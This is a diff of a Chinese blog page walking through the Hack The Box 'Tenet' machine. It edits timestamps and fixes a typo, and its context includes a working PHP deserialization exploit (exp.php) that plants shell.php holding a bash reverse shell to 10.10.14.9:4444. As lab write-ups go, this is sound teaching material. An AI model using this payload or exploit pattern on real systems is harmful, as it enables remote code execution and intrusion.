@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://i.loli.net/2021/05/25/sEIAFLSH3JGDjmh.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/25/uO7D1XeZ6PhRxya.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/25/wXW7nI4e2Ba3lYg.png">
-<meta property="og:updated_time" content="2021-05-25T15:12:49.422Z">
+<meta property="og:updated_time" content="2021-06-16T16:33:26.492Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hackthebox--Tenet">
 <meta name="twitter:description" content="0x00 信息收集依旧使用nmap进行端口扫描和服务识别： 12345678910111213141516171819┌──(root💀kali)-[/home/fnut/tenet]└─# nmap -sC -sV -oA tenet 10.129.150.173Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 09:12 EDTNma">
@@ -212,10 +212,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-05-25 21:51:02 / Modified: 23:12:49" itemprop="dateCreated datePublished" datetime="2021-05-25T21:51:02+08:00">2021-05-25</time>
+              <time title="Created: 2021-05-25 21:51:02" itemprop="dateCreated datePublished" datetime="2021-05-25T21:51:02+08:00">2021-05-25</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-06-17 00:33:26" itemprop="dateModified" datetime="2021-06-17T00:33:26+08:00">2021-06-17</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -267,7 +273,7 @@
 <p>反序列化对象会在不同场景调用不同的魔术方法：</p>
 <figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p>因此如果我们构造恶意的<code>user_file</code>和<code>data</code>数据传入到<code>arepo</code>参数，就可以控制反序列化函数在调用<code>__destruct()</code>时执行额易操作写shell文件。</p>
+<p>因此如果我们构造恶意的<code>user_file</code>和<code>data</code>数据传入到<code>arepo</code>参数，就可以控制反序列化函数在调用<code>__destruct()</code>时执行恶意操作写shell文件。</p>
 <p>根据<code>sator.php</code>源码构造<code>exp.php</code>如下：</p>
 <figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DatabaseExport</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">        <span class="keyword">public</span> $user_file = <span class="string">'shell.php'</span>;</span><br><span class="line">        <span class="keyword">public</span> $data = <span class="string">'<?php exec("/bin/bash -c \'bash -i >/dev/tcp/10.10.14.9/4444 0>&1\'");?>'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>{</span><br><span class="line">                file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">'/'</span> . <span class="keyword">$this</span> ->user_file, <span class="keyword">$this</span>->data);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[] Database updated <br>'</span>;</span><br><span class="line">        <span class="comment">//      echo 'Gotta get this working properly...';</span></span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://10.129.150.173/sator.php?arepo='</span>;</span><br><span class="line">$url = $url . urlencode(serialize(<span class="keyword">new</span> DatabaseExport));</span><br><span class="line">$response = file_get_contents(<span class="string">"$url"</span>);</span><br><span class="line">$response = file_get_contents(<span class="string">"http://10.129.150.173/shell.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?></span></span><br></pre></td></tr></tbody></table></figure>
 
